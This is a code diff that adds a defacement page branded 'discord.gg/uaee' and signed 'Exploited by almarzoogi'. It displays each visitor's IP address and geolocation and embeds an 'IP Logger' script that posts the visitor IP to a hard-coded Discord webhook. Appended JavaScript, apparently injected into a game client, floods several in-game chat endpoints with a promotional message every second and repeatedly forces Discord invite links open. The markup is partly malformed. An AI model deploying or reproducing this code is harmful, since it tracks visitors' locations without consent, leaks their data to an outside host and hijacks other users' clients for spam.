@@ -1,0 +1,161 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>discord.gg/uaee</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Courier New', Courier, monospace;
+      color: red;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      text-align: center;
+      background: transparent;
+    }
+
+    #bg-video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .info {
+      font-size: 1.4em;
+      text-shadow: 0 0 8px red, 0 0 15px red, 0 0 25px red;
+      letter-spacing: 2px;
+    }
+
+    .text {
+      font-size: 3em;
+      text-shadow: 0 0 10px red;
+      letter-spacing: 5px;
+      margin-top: 2vh;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Background Video -->
+  <video id="bg-video" autoplay muted loop playsinline>
+    <source src="https://cdn.discordapp.com/attachments/1190268487302656021/1402225485639057460/filtered-4DCCACCF-3626-4119-BECC-F215EB2DEBCD.mov?ex=689323bf&is=6891d23f&hm=c1b4cdc0c5b908466c3615ef2e6a55322fbd5fcfb08dcc3412859a3c6098ac7c&" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+
+  <!-- 🔊 Embedded MP3 Audio (autoplay + loop) -->
+  <audio autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1190268487302656021/1402231834296713339/47627847f2fc5302.mp4?ex=689329a9&is=6891d829&hm=14d85cdf0a254c802e22c597f49090ffcf6d46409c225535f79dc0ddffb5fa47&" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
+  <!-- IP Info Display -->
+  <div class="info" id="ip-info">
+    <strong>IP: <span id="ip"></span></strong><br>
+    <span><strong>City:</strong> <span id="city"></span></span><br>
+    <span><strong>Region:</strong> <span id="region"></span></span><br>
+    <span><strong>Country:</strong> <span id="country"></span></span><br>
+    <span><strong>Location:</strong> <span id="loc"></span></span><br>
+    <span><strong>Organization:</strong> <span id="org"></span></span><br>
+    <span><strong>Timezone:</strong> <span id="timezone"></span></span>
+  </div>
+
+  <!-- Footer Text -->
+  <div class="text">discord.gg/uaee
+  
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Logger (Educational)</title>
+</head>
+<body>
+  <h1></h1>
+  <p id="ip"</p>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1400909538152022158/obElHYs0QgXtexTZgR4QPP7pFToE6dLi4lUXZ3D2B9u7ps_k1qrWdj7woYGljhVW8dvc";
+
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        document.getElementById('ip').textContent = ip;
+        const payload = {
+          content: `🛰️ New Visitor IP: \`${ip}\``
+        };
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        }).then(res => {
+          console.log("IP sent to Discord.");
+        }).catch(err => {
+          console.error("Failed to send to Discord:", err);
+        });
+
+      })
+      .catch(error => {
+        document.getElementById('ip').textContent = "Failed to load IP.";
+        console.error("IP fetch error:", error);
+      });
+  </script>
+</body>
+</html>
+
+  
+  
+  Exploited by almarzoogi 😉</div>
+
+  <!-- IP Lookup Script -->
+  <script>
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("ip").textContent = data.ip;
+        document.getElementById("city").textContent = data.city;
+        document.getElementById("region").textContent = data.region;
+        document.getElementById("country").textContent = data.country;
+        document.getElementById("loc").textContent = data.loc;
+        document.getElementById("org").textContent = data.org;
+        document.getElementById("timezone").textContent = data.timezone;
+      });
+  </script>
+
+</body>
+</html>
+
+const msg = `👑 vjmi & BoM6er - .gg/UAEE ! 👑`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+window.invokeNative("openUrl", "https://discord.gg/uaee");
+}, 1000);
+    </script>
